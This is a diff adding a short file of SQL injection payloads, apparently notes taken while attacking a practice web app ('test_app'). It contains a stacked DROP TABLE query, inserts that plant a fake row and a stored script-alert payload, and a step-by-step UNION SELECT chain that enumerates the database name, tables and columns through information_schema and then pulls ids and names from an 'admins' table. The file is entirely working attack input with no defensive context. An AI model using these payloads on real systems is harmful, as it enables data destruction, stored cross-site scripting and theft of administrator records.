@@ -1,0 +1,14 @@
+ INSERT INTO data (name, temperature) VALUES ('tmp', 1)
+
+INSERT INTO data (name, temperature) VALUES ('tmp', 1);DROP TABLE#
+INSERT INTO data (name, temperature) VALUES ('tmp', 1),('hacker',-100)#
+INSERT INTO data (name, temperature) VALUES ('tmp', 1),('<script>alert(1)</script>',-100)#
+
+SELECT * FROM data where name='Bathroom' UNION SELECT NULL, NULL, NULL#
+SELECT * FROM data where name='Bathroom' UNION SELECT database(), null, null# -> get db name
+SELECT * FROM data where name='Bathroom' UNION SELECT table_name, null, null FROM information_schema.tables where table_schema ='test_app'# -> data & admins
+
+SELECT * FROM data where name='Bathroom' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='data'#
+SELECT * FROM data where name='Bathroom' UNION SELECT column_name, NULL, NULL FROM information_schema.columns WHERE table_name='admins'#
+
+SELECT * FROM data where name='Bathroom' UNION SELECT id, name, NULL from admins#
